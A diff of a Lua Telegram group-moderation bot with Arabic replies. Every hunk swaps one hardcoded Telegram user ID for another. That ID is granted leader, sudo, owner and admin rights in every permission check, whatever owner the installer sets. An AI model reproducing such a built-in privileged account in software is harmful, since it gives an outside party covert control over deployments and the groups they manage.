@@ -27,7 +27,7 @@ local AutoSet = function()
 io.write("\27[31;47m Ξ • الان ارسل ايدي المطور •\n Ξ   • Now send your id • \27[0;34;49m\n")  
 local SUDO = tonumber(io.read())   
 if not tostring(SUDO):match('%d+') then  
-local SUDO = 218385683
+local SUDO = 717869155
 end
 io.write("\27[31;47m Ξ • @الان ارسل معرف المطور مع الـ •\n Ξ • Now send your username with @ • \27[0;34;49m\n")  
 local username = io.read()
@@ -71,7 +71,7 @@ file:write([[
 killall screen
 while(true) do
 rm -fr ../.telegram-cli
-screen ./RUNmod.sh
+screen ./RUNMOD.sh
 done
 ]])  
 file:close() 
@@ -114,13 +114,13 @@ name_bot = (engoy:get(UIImodIIU..'name_bot') or 'بروكس')
 function is_leader(msg) 
 local var = false 
 if msg.sender_user_id_ == tonumber(bot_owner) then var = true end 
-if msg.sender_user_id_ == tonumber(218385683) then var = true end 
+if msg.sender_user_id_ == tonumber(717869155) then var = true end 
 return var end 
 
 function is_leaderid(user_id)
 local var = false
 if user_id == tonumber(bot_owner) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(717869155) then var = true end 
 return var end
 --     Source UIImodIIU     --
 ----------  Sudo  ----------
@@ -131,7 +131,7 @@ if msg.sender_user_id_ == v then
 var = true
 end end
 if msg.sender_user_id_ == tonumber(bot_owner) then var = true end
-if msg.sender_user_id_ == tonumber(218385683) then var = true end 
+if msg.sender_user_id_ == tonumber(717869155) then var = true end 
 return var end
 
 function is_sudoid(user_id)
@@ -141,7 +141,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(bot_owner) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(717869155) then var = true end 
 return var end
 --     Source UIImodIIU     --
 ----------  Sudo3  ---------
@@ -157,7 +157,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(bot_owner) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(717869155) then var = true end 
 return var end
 --     Source UIImodIIU     --
 ----------Owner all---------
@@ -178,7 +178,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(bot_owner) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(717869155) then var = true end 
 return var end
 --     Source UIImodIIU     --
 ----------admin all---------
@@ -204,7 +204,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(bot_owner) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(717869155) then var = true end 
 return var end
 --     Source UIImodIIU     --
 ------ VIP MEMBER ALL ------
@@ -235,7 +235,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(bot_owner) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(717869155) then var = true end 
 return var end
 --     Source UIImodIIU     --
 ----------  donky  ---------
@@ -281,7 +281,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(bot_owner) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(717869155) then var = true end 
 return var end
 --     Source UIImodIIU     --
 ----------  monsh  ---------
@@ -302,7 +302,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(bot_owner) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(717869155) then var = true end 
 return var end
 --     Source UIImodIIU     --
 ---------  Monsh2  ---------
@@ -328,7 +328,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(bot_owner) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(717869155) then var = true end 
 return var end
 --     Source UIImodIIU     --
 ----------  Owner  ---------
@@ -359,7 +359,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(bot_owner) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(717869155) then var = true end 
 return var end
 --     Source UIImodIIU     --
 ----------  admin  ---------
@@ -400,7 +400,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(bot_owner) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(717869155) then var = true end 
 return var end
 --     Source UIImodIIU     --
 ---------VIP MEMBER---------
@@ -451,7 +451,7 @@ if user_id == v then
 var = true
 end end
 if user_id == tonumber(bot_owner) then var = true end
-if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(717869155) then var = true end 
 return var end
 --     Source UIImodIIU     --
 local setnumbergp = function()
@@ -1094,7 +1094,7 @@ ChekName = utf8.sub(Name,0,Num) Name = ChekName return Name..''
 end
 --     Source UIImodIIU     --
 local mod_rank = function(msg)
-if tonumber(msg.sender_user_id_) == tonumber(218385683) then
+if tonumber(msg.sender_user_id_) == tonumber(717869155) then
 mod_OEnGoYO  = "مبرمج ٱڵسورس"
 elseif is_leaderid(msg.sender_user_id_) then
 mod_OEnGoYO  = "ٱڵمطۄر ٱلٱسٱسي"
@@ -4531,7 +4531,7 @@ end
 --     Source UIImodIIU     --
 if text:match("^رتبتي$") and Abbas_mod(msg) then
 function get_rtba(extra,result,success)
-if tonumber(result.id_) == tonumber(218385683) then
+if tonumber(result.id_) == tonumber(717869155) then
 t = 'مبرمج ٱڵسورس'
 elseif tonumber(result.id_) == tonumber(bot_owner) then
 t = 'ٱڵمطۄر ٱلٱسٱسي'
@@ -4579,7 +4579,7 @@ local Photo = (tonumber(engoy:get(UIImodIIU.."Photo:"..msg.sender_user_id_..":".
 local Voice = (tonumber(engoy:get(UIImodIIU.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
 local Gif = (tonumber(engoy:get(UIImodIIU.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
 local Video = (tonumber(engoy:get(UIImodIIU.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
-if tonumber(result.id_) == tonumber(218385683) then
+if tonumber(result.id_) == tonumber(717869155) then
 if engoy:get(UIImodIIU..'lang:gp:'..msg.chat_id_) then
 t = 'Source programmer'
 else
@@ -6660,7 +6660,7 @@ end end
 --     Source UIImodIIU     --
 if text ==("كشف")  and msg.reply_to_message_id_ ~= 0 then 
 function id_by_reply(extra, result, success) 
-if tonumber(result.sender_user_id_) == tonumber(218385683) then
+if tonumber(result.sender_user_id_) == tonumber(717869155) then
 t = 'مبرمج ٱڵسورس'
 elseif tonumber(result.sender_user_id_) == tonumber(bot_id) then
 t = 'هاذا البوت'
@@ -6782,7 +6782,7 @@ mod_enG(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
 end
 return false  end
 if res.id_ then  
-if tonumber(res.id_) == tonumber(218385683) then
+if tonumber(res.id_) == tonumber(717869155) then
 t = 'مبرمج ٱڵسورس'
 elseif tonumber(res.id_) == tonumber(bot_id) then
 t = 'هاذا بوت'
@@ -6871,7 +6871,7 @@ return false
 end
 if text and text:match('كشف (%d+)') then 
 local iduser = text:match('كشف (%d+)')  
-if tonumber(iduser) == tonumber(218385683) then
+if tonumber(iduser) == tonumber(717869155) then
 t = 'مبرمج ٱڵسورس'
 elseif tonumber(iduser) == tonumber(bot_id) then
 t = 'هاذا البوت'
@@ -7020,7 +7020,7 @@ t = 'Member'
 end
 end
 if not engoy:get(UIImodIIU..'lang:gp:'..msg.chat_id_) then
-if tonumber(result.id_) == tonumber(218385683) then
+if tonumber(result.id_) == tonumber(717869155) then
 t = 'مبرمج ٱڵسورس'
 elseif tonumber(result.id_) == tonumber(bot_owner) then
 t = 'ٱڵمطۄر ٱلٱسٱسي'
@@ -7110,7 +7110,7 @@ t = 'Member'
 end
 end
 if not engoy:get(UIImodIIU..'lang:gp:'..msg.chat_id_) then
-if tonumber(result.id_) == tonumber(218385683) then
+if tonumber(result.id_) == tonumber(717869155) then
 t = 'مبرمج ٱڵسورس'
 elseif tonumber(result.id_) == tonumber(bot_owner) then
 t = 'ٱڵمطۄر ٱلٱسٱسي'
@@ -7198,7 +7198,7 @@ t = 'Member'
 end
 end
 if not engoy:get(UIImodIIU..'lang:gp:'..msg.chat_id_) then
-if tonumber(result.id_) == tonumber(218385683) then
+if tonumber(result.id_) == tonumber(717869155) then
 t = 'مبرمج ٱڵسورس'
 elseif tonumber(result.id_) == tonumber(bot_owner) then
 t = 'ٱڵمطۄر ٱلٱسٱسي'
@@ -7432,7 +7432,7 @@ local user_nkt = tonumber(engoy:get(UIImodIIU..'bot:add:num'..msg.chat_id_..msg.
 local cont = (tonumber(engoy:get(UIImodIIU..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
 local msguser = tonumber(engoy:get(UIImodIIU..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
 if result.photos_[0] then
-if tonumber(msg.sender_user_id_) == tonumber(218385683) then
+if tonumber(msg.sender_user_id_) == tonumber(717869155) then
 if engoy:get(UIImodIIU..'lang:gp:'..msg.chat_id_) then
 t = 'Source programmer'
 else
@@ -7530,7 +7530,7 @@ local new_id = new_id:gsub('rank',(t or 'لا يوجد'))
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
 end
 else
-if tonumber(msg.sender_user_id_) == tonumber(218385683) then
+if tonumber(msg.sender_user_id_) == tonumber(717869155) then
 if engoy:get(UIImodIIU..'lang:gp:'..msg.chat_id_) then
 t = 'Source programmer'
 else
@@ -7634,7 +7634,7 @@ mod_enG(msg.chat_id_, msg.id_, 1, '❗️🚸 ∴ عذرٱ ٱلٱيدي مۘعط
 end
 end
 else
-if tonumber(msg.sender_user_id_) == tonumber(218385683) then
+if tonumber(msg.sender_user_id_) == tonumber(717869155) then
 if engoy:get(UIImodIIU..'lang:gp:'..msg.chat_id_) then
 t = 'Source programmer'
 else
@@ -7721,7 +7721,7 @@ else
 mod_enG(msg.chat_id_, msg.id_, 1, "❗️⚠️ ∴ لٱ ٱستطيع عرض صورتک \n❗️📛 ∴ ربمٱ لٱ تمتڵك صورة شخصية \n❗️📛 ∴ ٱو ٱنك قمت بحظر ٱڵـبوت \n❗️📛 ∴ ٱو ٱنك قفڵتهٱ من ٱلٱعدٱدٱت \n╭━•━•━•━🅔🅝🅖━•━•━•━╮\n❗️🚸 ∴ معرفک ⇜ ◝ "..username.." ◟\n❗️🔑 ∴ ٱيـډيک ⇜ ◝ "..msg.sender_user_id_.." ◟\n❗️📣 ∴ رتـبتک ⇜ ◝ "..t.." ◟\n❗️🎗 ∴ صورک ⇜ ◝ "..result.total_count_.." ◟\n❗️〽️ ∴ رسٱئڵک ⇜ ◝ "..(user_msgs + mod_enGs).." • "..(mod_OEnGoYO).." ◟\n❗️⚜️ ∴ تفٱعڵک ⇜ ◝ "..formsgg(msguser).." ◟\n❗️📯 ∴ جـهٱتک ⇜ ◝ "..cont.." ◟\n❗️🔅 ∴ نقاطک ⇜ ◝ "..user_nkt.." ◟\n❗️🛎 ∴ مڵصقٱتک ⇜ ◝ "..sticker.." ◟\n╭━•━•━•━🅔🅝🅖━•━•━•━╮\n", 1, 'html')
 end
 else
-if tonumber(msg.sender_user_id_) == tonumber(218385683) then
+if tonumber(msg.sender_user_id_) == tonumber(717869155) then
 if engoy:get(UIImodIIU..'lang:gp:'..msg.chat_id_) then
 t = 'Source programmer'
 else
